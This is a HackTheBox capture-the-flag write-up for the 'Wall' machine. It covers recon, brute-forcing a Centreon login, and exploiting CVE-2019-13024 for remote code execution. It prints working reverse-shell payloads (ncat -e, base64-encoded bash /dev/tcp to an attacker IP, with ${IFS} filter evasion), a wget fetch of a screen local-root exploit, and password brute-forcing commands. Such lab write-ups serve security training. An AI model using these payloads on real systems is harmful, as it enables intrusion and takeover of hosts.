---
title: "Wall - HackTheBox"
date: 2019-12-07T17:00:00+02:00
tags: []
---

## Information gathering

Let's start with a port scan:
```
$ nmap -A -T4 10.10.10.157
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 19:40 EDT
Nmap scan report for 10.10.10.157
Host is up (0.090s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.53 seconds
```

The web server has the Apache's default homepage.

Running a quick discovery gives us some pages to visit:
```
$ gobuster dir -q -t 40 -w raft-medium-files.txt -u http://10.10.10.157
/index.html (Status: 200)
/panel.php (Status: 200)
/wp-forum.phps (Status: 403)
/aa.php (Status: 200)
```

```
$ gobuster dir -q -t 40 -w raft-medium-directories.txt -u http://10.10.10.157
/monitoring (Status: 401)
/server-status (Status: 403)
```

## Exploration

`/aa.php` and `/panel.php` do not contain anything useful and `/monitoring` is
protected by HTTP basic authentication, which I tried to bruteforce with no
success. After a bit of tinkering, I found that making a `POST` request to
`/monitoring` redirects you to a page containing a link to `/centreon`:

```
$ curl -X POST -L http://10.10.10.157/monitoring
<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>

<meta http-equiv="refresh" content="0; URL='/centreon'" />
```

Visiting `/centreon` we find ourselves in front of a login form for the Centreon
platform, which is a system monitoring tool:

![](/images/hackthebox/wall/centreon.png)

Let's try to login with a random username and password, and intercept the
request with Burp:
![](/images/hackthebox/wall/login.png)

The login process uses a token that changes with every request, so we can not
use hydra to do a bruteforce. We might write a script that fetches the token and
makes the login request, but whenever I stumble upon new web applications, I
like to learn how the mechanisms behind them are implemented. Centreon, in this
case, have an API that can be used to authenticate users and get a token. We can
then use wfuzz to find valid combination of username and password.

Before we launch the bruteforce, let's check if the API endpoint is up and
running:
```
$ curl -d "username=test&password=test" "http://10.10.10.157/centreon/api/index.php?action=authenticate"
"Bad credentials"
```

Ok, the authentication API works. A quick search tells us that the default
username on Centreon is `admin`, so let's start a bruteforce on that:

```
$ wfuzz -c --hc 403  -w probable-v2-top1575.txt -d 'username=admin&password=FUZZ' "http://10.10.10.157/centreon/api/index.php?action=authenticate"
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.157/centreon/api/index.php?action=authenticate
Total requests: 1575

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000048:   200        0 L      1 W      61 Ch       "password1"

Total time: 12.86365
Processed Requests: 1575
Filtered Requests: 1574
Requests/sec.: 122.4380
```

Nice! Look's like admin's password is `password1`! Let's use it to login.

## Exploiting

Here is the panel after logging in:
![](/images/hackthebox/wall/panel.png)
The menu on the right of the Centreon panel allows us to discover it's version
by going on Administration > About, and it's 19.04.0 commit `f2a106936`.

A search on Google immediately points us toward a remote code execution
identified by `CVE-2019-13024`:

> Centreon 18.x before 18.10.6, 19.x before 19.04.3, and Centreon web before
> 2.8.29 allows the attacker to execute arbitrary system commands by using the
> value "init_script"-"Monitoring Engine Binary" in main.get.php to insert a
> arbitrary command into the database, and execute it by calling the vulnerable
> page www/include/configuration/configGenerate/xml/generateFiles.php (which
> passes the inserted value to the database to shell_exec without sanitizing it,
> allowing one to execute system arbitrary commands).

The identification code for the exploit is `47069` on exploit-db, so let's
download it with `searchsploit -m 47069`. Let's have a look at the payload
section:
```python
payload_info = {
    "name": "Central",
    "ns_ip_address": "127.0.0.1",
    # this value should be 1 always
    "localhost[localhost]": "1",
    "is_default[is_default]": "0",
    "remote_id": "",
    "ssh_port": "22",
    "init_script": "centengine",
    # this value contains the payload , you can change it as you want
    "nagios_bin": "ncat -e /bin/bash {0} {1} #".format(ip, port),
    "nagiostats_bin": "/usr/sbin/centenginestats",
    "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
    "centreonbroker_cfg_path": "/etc/centreon-broker",
    "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
    "centreonbroker_logs_path": "",
    "centreonconnector_path": "/usr/lib64/centreon-connector",
    "init_script_centreontrapd": "centreontrapd",
    "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
    "ns_activate[ns_activate]": "1",
    "submitC": "Save",
    "id": "1",
    "o": "c",
    "centreon_token": poller_token,
}
```

The `nagios_bin` field is the one that will be executed on the server.  The
first thing to do is to launch a netcat listener on our machine with `nc -lnvp
1337`.  

The first thing that we should do is to change all the URLs in the script by
prepending `/centreon` to them, as this is the location that it's installed to
on the machine.


Launching the exploit with our ip address and port, to get a reverse shell, does
not work, because there might be some characters that are not allowed in the
command. Let's try to create a string that could bypass the protections.  
We can encode with base64 our command to avoid using characters like `>` and
`&`:
```
$ echo -n "/bin/bash -i >& /dev/tcp/10.10.14.4/1337 0>&1" | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQvMTMzNyAwPiYx
```

I used a bash reverse shell command to connect to our netcat listener because I
don't know which is the version of it on the server (if present at all), as the
syntax may vary from one to another.

Ok, now we have a base64 encoded reverse shell command. Let's add the decoding
command and pipe the result in bash:
```
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQvMTMzNyAwPiYx | base64 -d | sh
```

Now let's set `nagios_bin` to use this command and remove the `.format(ip,
port)` as it's not needed anymore:
```
"nagios_bin": "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQvMTMzNyAwPiYx | base64 -d | bash",
```

It still does not work, probably because of white spaces, so let's replace them with `${IFS}`:
```
"nagios_bin": "echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQvMTMzNyAwPiYx|base64${IFS}-d|bash",
```

This still does not work, probably because of some sort of command concatenation
error, so let's add a `;` after the bash command
```
"nagios_bin": "echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQvMTMzNyAwPiYx|base64${IFS}-d|bash;",
```

This time we finally have a connection from the server, so the exploit worked!

```
$ nc -lnvp 1337
bash: cannot set terminal process group (982): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Wall:/usr/local/centreon/www$
```

## Privilege escalation
At first I saw this message `[+] We can connect to the local MYSQL service as
'root' and without a password!` and I tried to use mysql to get a shell, but I
could not get a stable output because of the shell running on netcat. I
continued reading LinEnum's output and I found an unusual executable in the
`SUID` files section:
![](/images/hackthebox/wall/linenum.png)

It is `screen-4.5.0`, and luckily, there's a handy local root exploit on
[exploit-db](https://www.exploit-db.com/exploits/41154). After downloading it on
our machine, let's start a web server with `python -m http.server 8080` and
let's download it on the remote machine with `wget
http://10.10.14.4:8080/41154.sh`. Just run it and a couple of seconds later we should
have a root shell! Let's read the flags:

```
wc -c /home/shelby/user.txt
33 /home/shelby/user.txt

wc -c /root/root.txt
33 /root/root.txt
```

I really couldn't find a way from `www-data` to `shelby`, except for some hashes
in `/etc/shadow` but I couldn't crack them, I guess I'll wait for Ippsec's
writeup!

Thanks for reading!
